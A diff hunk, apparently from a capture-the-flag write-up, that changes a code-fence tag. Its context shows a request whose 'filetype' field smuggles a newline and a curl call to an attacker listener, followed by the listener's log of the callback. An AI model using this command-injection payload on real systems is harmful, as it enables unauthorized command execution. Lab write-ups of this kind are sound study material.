@@ -246,7 +246,7 @@ Connection: close
 photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg%0acurl%2010.10.14.161:8000/&dimensions=30x20
 ```
 And we receive it on our local server!
-```http
+```
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Accepted
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 [404]: GET / - No such file or directory
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Closing
